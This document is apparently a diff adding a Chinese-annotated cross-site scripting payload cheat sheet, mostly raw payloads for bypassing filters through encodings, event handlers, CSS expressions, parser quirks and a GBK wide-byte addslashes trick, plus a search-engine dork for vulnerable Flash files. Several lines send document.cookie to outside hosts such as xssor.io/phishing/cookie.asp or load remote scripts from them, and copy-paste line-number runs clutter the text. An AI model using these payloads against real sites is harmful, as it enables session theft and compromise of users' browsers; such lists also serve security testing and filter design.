@@ -1,0 +1,406 @@
+http://localhost/kindeditor/index.php?name=<pre><script>alert('XSS');</script>by ZSL!</pre>
+
+location=unescape`%68%74%74%70%3A%2F%2F%67%6F%6F%67%6C%65%2E%63%6F%6D`
+location=/http/.source+/:/.source[0]+/\//.source[1]+/\//.source[1]+/google.com/.source
+<img/src=q onerror='new Function`al\ert\`1\``'>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<style/onload=prompt('XSS')
+       <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+       <div/onmouseover='alert(1)'> style="x:">
+      <input onblur=write(1) autofocus><input autofocus>                ============
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>       =========
+<body oninput=confirm(1)><input autofocus>
+
+输出在src/href/action等属性内，除了闭合之外，还可以像下面这样：
+javascript:alert(1)//
+data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==
+输出在on*事件内
+style，只要能注入expression关键词，并进行适当的闭合，就可以认为存在xss注入。
+如：1;xss:expression(if(!window.x){alert(1);window.x=1;})
+
+来源：http://xssor.io/s/payload/xssmisc.txt
+如果过滤掉了alert，可以试试confirm()和prompt()方法。
+如：<img src='' onerror=confirm(0)>
+<d3"<"/onclick="1>[confirm``]"<">z     -------chrome和Firefox下点击弹框
+<svg/onload=alert(1)>
+<svg/onload=alert(1)//
+>"'
+'';!--"<XSS>=&{()}
+'';!--"<script>alert(0);</script>=&{()}
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+`><script>alert(0)</script>
+<script>a=eval;b=alert;a(b(/i/.source));</script>
+<code onmouseover=a=eval;b=alert;a(b(/g/.source));>HI</code>
+"onmouseover=alert(1)x="
+
+<script src=http://xssor.io/xss.js></SCRIPT>
+<script>location.href='http://127.0.0.1:8088/cookie.php?cookie='+escape(document.cookie);</script>
+
+<img src="x" onerror="confirm(1)//
+'"><img onerror=alert(0) src=><"'
+<img src=http://127.0.0.1/myspace.asp>
+<img src=&#04jav&#13;ascr&#09;ipt:al&#13;ert(0)>
+<img src=&#04jav&#13;ascr&#09;ipt:i="x=document.createElement('script');x.src='http://xssor.io/xn.js';x.defer=true;document.getElementsByTagName('head')[0].appendChild(x)";execScript(i)>
+<img src=&#04jav&#13;ascr&#09;ipt:i="x=docu&#13;ment.createElement('\u0053\u0043\u0052\u0049\u0050\u0054');x.src='http://xssor.io/xn.js';x.defer=true;doc&#13;ument.getElementsByTagName('head')[0].appendChild(x)";execScri&#13;pt(i)>
+new Image().src="http://xssor.io/phishing/cookie.asp?cookie="+escape(document.cookie);
+
+<iframe src=http://www.baidu.com/></iframe>
+<iframe src=javascript:alert('xss');height=0 width=0/></iframe>
+<body background=javascript:alert(/xss/)></body>
+body{xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))}
+<style>body{width:ｅxpression(parent.document.write(unescape('%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E')));}</style>
+a{xxx:expression(if(!window.x){alert('xss');window.x=1;})}
+a{xxx:\65\78\70\72\65\73\73\69\6f\6e\28\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\27\78\73\73\27\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\3b\7d\29}
+body{background:url("javascript:alert('xss')")}
+body{background:url(JavAs	cr	
+ipt:alert(0))}
+<style>@im\port'\ja\vasc\ript:alert("xss")';</style>
+@i\6d\70o\72\74'javascr\ipt:alert(document.cookie)';
+<div style=xss:expres&#92sion(if(!window.x){alert('xss');window.x=1;})></div>
+
+alert(String(/xss/).substr(1,3))
+alert(/xss/.source)
+<a onclick="i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);" href="#">Test</a>
+x='\x61\x6c\x65\x72\x74\x28\x31\x29';new Function(x)()
+<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41">Test</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=">Test</a>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+<div style="-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;'):1);"id="inject">
+
+javascript:document.scripts[0].src='http://127.0.0.1/yy.js';void(0);
+<a href="javascript:x=open('http://www.xiaonei.com/');setInterval (function(){try{x.frames[0].location={toString:function(){return%20'http://xssor.io/Project/poc/docshell.html';}}}catch(e){}},3000);void(1);">Test</a>
+
+<script/onreadystatechange=alert(1)>
+<script/src=data:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,alert(4)></script>
+javascript:document.cookie=window.prompt("edit cookie:",document.cookie);void(0);
+<input id=11 name=s value=`aa`onclick=alert(/xss/)>
+<input value:aa/onclick=alert(/xss/)>
+<li style=list-style:url() onerror=alert(1)>
+<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
+<head><base href="javascript://"></head><body><a href="/. /,alert(1)//#">XXX</a></body>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+
+[!] ie only:
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x
+<title onpropertychange=alert(1)></title><title title=>
+<!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(1)//]> -->
+
+[!] parsing error:
+<!--<img src="--><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1))//">
+<![><img src="]><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<b <script>alert(1)</script>0
+<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+
+[!] special tags parsing issues, from: http://html5sec.org/#html
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+<% foo><x foo="%><script>alert(1)</script>">
+
+[!] fuzzing tips: 
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:alert(1)>XXX</a>
+
+[!] utf-7 bom
++/v8
++/v9
++/v+
++/v/
+
+[!] html5sec.org
+<svg/onload=alert(1)>
+<svg/onload=alert(1)//
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<video><source onerror="alert(1)">
+<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>
+<frameset onload=alert(1)>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<title><img src="</title><img src=x onerror=alert(1)//"> // by evilcos
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<frameset onpageshow="alert(1)">
+<body onpageshow="alert(1)">
+
+<script>`</div><div>`-alert(123)</script>
+<script>`</div><div>`+alert(123)</script>
+<script>`</div><div>`/alert(123)</script>
+<script>`</div><div>`%alert(123)</script>
+<script>`</div><div>`==alert(123)</script>
+<script>`</div><div>`/=alert(123)</script> # Only Edge
+<script>`</div><div>`*=alert(123)</script> # Only Edge
+
+<img/src=="x onerror=alert(1)//">
+<div/style=="x onclick=alert(1)//">XSS'OR
+<div style=behavior:url(" onclick=alert(1)//">XSS'OR
+<div style=x:x(" onclick=alert(1)//">XSS'OR
+
+<div> <a href=/**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
+<div><base href="javascript:/"><a href=/**/alert(1)>XSS</a></div>
+<div><base href="javascript:\"><a href=/**/alert(1)>XSS</a></div>
+<div><base/href=javascript:/><a href=/*'"+-/%~.,()^&$#@!*/alert(1)>XSS</a></div>
+
+<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
+
+[!] More will be added......
+[!] By evilcos
+
+<Body onload=YourScript></body>
+<Img src='' onerror=YourSrcip/t>
+<object data='YourXSSSite')></object>
+
+%c0%5c%0aalert(1);//
+
+
+
+
+
+
+
+
+
+
+
+
+xss绕过技巧整理
+可以通过u003c和u003e来代替<和>
+
+几种弹窗绕过
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+alert(1) = Function(alert(1))()
+= Function(String.fromCharCode(97,108,101,114,116,40,49,41))()
+97,108,101,114,116,40,49,41对应alert(1) ascii码的10进制形式（Text2Dec）
+//小写function
+(function(){
+alert(1)
+})()
+
+alert(1) confirm(1)  prompt(1)
+<SVG/onload=prompt(1)>
+<BODY onload="alert('XSS')">
+<img src=1 onerror=alert(1)>
+<img src onerror=alert(1)>
+<script src=alert(1)></scirpt>
+<form action="javascript:prompt(1)" method="post"><input name="action" value="b"></form>
+
+eg:
+<p class="comment" title=""><svg/a="></p>
+<p class="comment" title=""onload='/*"></p>
+<p class="comment" title="*/prompt(1)'"></p>   ==》<p class="comment" title=""><svg/a=""xxx"/onload='prompt(21)'"></p>
+
+1
+2
+3
+//过滤= 括号等 使用xml编码
+<svg> <script>prompt&#40;1)</script>
+//在SVG向量里面的<script>元素（或者其他CDATA元素 ），会先进行xml解析。因此&#x28（十六进制）或者&#40（十进制）或者&lpar；（html实体编码）会被还原成（。
+
+1
+2
+3
+可以不封的有:
+<img><br><input><li><p><SVG>
+其他标签不封闭会造成页面显示错误等问题。
+
+xss中最经常用到的编码
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+html实体编码(10进制与16进制):
+如把尖括号编码[ < ]  -----> html十进制: &#60;  html十六进制:&#x3c;
+javascript的八进制跟十六进制:
+如把尖括号编码[ < ]  -----> js八进制:\74  js十六进制:\x3c
+jsunicode编码：
+如把尖括号编码[ < ]  ----->jsunicode:\u003c
+url编码:
+如把尖括号编码[ < ]  -----> url: %22
+base64编码:
+如把尖括号编码[ < ]  -----> base64: Ig==
+
+一些绕过方法
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+换行符 %0a
+反斜线 %5c （js中字符串可以用\分开）
+<>  %3C%3E
+注释/**/可以代替 空格符
+%c0(宽字符gb2312)可以吃掉%5c(反斜线) 
+javascript中的字符可以写成unicode编码：
+< 可以表示为 \u003c , > 可以表示为 \u003e，空格可以表示为\u0020
+< 可以表示为 \x3c , > 可以表示为 \x3e，空格可以表示为\x20
+<img src=1 onerror=alert(1)>   ----> \u003Cimg\u0020src=1\u0020onerror=alert(1)\u003e
+---->  \x3Cimg\u0020src=1\u0020onerror=alert(1)\x3e
+
+JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为\u0027或\x27,可尝试\有没有被过滤
+<textarea>、<title>、<iframe>标签不解析HTML
+"h"+"t"+"t"+"p"，绕过对http的过滤
+<input onfocus="alert(1)" autofocus>，自动执行
+<scr<script>ipt>绕过对<script>的过滤
+/**/绕过对空格的过滤<script>document.write("<img/**/src='1'/**/onerror='alert(1)'/>");</script>
+<script>标签中多对输入可以结合/**/的使用
+var a = "";/*"; 值为：";/*，（首先闭合双引号，然后使用/*注释，与下面注释进行闭合）var b = "*/alert(1)//"; 值为：*/alert(1)//
+
+如果是图片可能是判定后缀名在最后加上.jpg
+突破对长度的限制<script>eval(location.hash.slice(1))</script>#alert(‘a’)
+data协议，绕过chrome 
+filter.php?url=<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>click<a>
+IE的注释方式<!--[if IE]><img src=# width=0 height=0 onerror=alert(/insight-labs/)><![endif]-->
+
+chrome会自动对", >, < 进行转换。
+<script>alert(1)</script>
+chrome会过滤为<script></script>,绕过：<script src='127.0.0.1/1.js'></script> 其中1.jp也可以是1.jpg等，内容为js代码如:alert(1)
+
+chrome如何搜索关键字
+基本语句肯定是 site:qq.com filetype:swf
+意思是，限定域名为qq.com 文件类型为FLASH文件。
+显然这样会搜索出很多FLASH文件，不利于我们后续的漏洞查找，所以我们需要输入某个关键词来进一步缩小范围。
+这里我列举一些寻找关键词的方式。
+1 已知存在缺陷的FLASH文件名或参数名，如：swfupload,jwplayer等
+2 多媒体功能的FLASH文件名，如：upload，player, music, video等
+3 调用的外部配置或数据文件后缀，如: xml, php 等
+4 前期经验积累下来的程序员特征参数名用词，如: callback, cb , function 等
+结合以上经验，使用其中第三条：
+搜索： site:qq.com filetype:swf inurl:xml
+可以找到这个FLASH
+插入漏洞方式
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+1 JavaScript中字符串之间的运算利用
+<a href="javascript:alert(1)//html">click me</a>
+<a href="javascript:alert(1)-html">click me</a>
+执行呈现相同的效果，因为javascript是弱类型语言，所以字符串与字符串之间的各种运算都是合法的
+
+2 HTML属性在执行时会做HTMLDecode编码
+HTML属性：十进制和十六进制，&#56和&#x5a形式 
+CSS属性：十进制和十六进制，\6c形式
+JavaScript：八进制和十六进制，\56,和\x5c形式，汉字需要使用Unicode编码，\u0000形式
+<img src="http://www.baidu.com/img/bdlogo.gif">
+<img src="&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x62;&#x61;&#x69;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x69;&#x6d;&#x67;&#x2f;&#x62;&#x64;&#x6c;&#x6f;&#x67;&#x6f;&#x2e;&#x67;&#x69;&#x66;";>
+需要留出双引号，不可对双引号进行转移
+
+3、宽字节处理addslashs，单引号、双引号、反斜杠之前加反斜杠的情况
+原理：网页头部指明这是GBK编码，GBK编码第一字节的范围是0x81~0xFE，第二字节的范围是0x40~0x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好是GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符。
+<?php 
+header("Content-Type:text/html;charset=GBK");?>  
+<script>      
+var a="
+<?php 
+echo addslashes($_GET['url']);
+?>
+";  
+</script>
+?>  构造：.php?url=123%81";alert(1);//
+
+4、UTF-7编码(仅IE支持，会自动判断是否出现UTF-7编码的字符串)
+
+DOM xss特点
+利用代码也是在地址栏里输入，
+在JS里，通过location.search得到地址里的代码，类似的还有:
+A.location.href : 地址栏里的地址,
+B.location.hash: 地址栏里#及其之后的内容,
+C.document.referrer: 当前页面的源（比如你从A.com点一个链接进入了B.com，那么B.com里的document.referrer等于A.com）
+通过JS设置了iframe的src属性，这是一个典型的通过JS操作属性而导致的XSS。
+查找此类漏洞的方法
+以location为关键词进行查找，
+进而看location传入的参数是否被过滤后再进行使用。
+如有未过滤而被调用的情况，则考虑如何构造利用代码。
+
+
+
+DOM型XSS示例：
+示例：
+<html>
+<script>
+eval(location.hash.substr(1));
+</script>
+</html>
+
+http://xx.xx.xx.xx/test.html#alert(1)
+
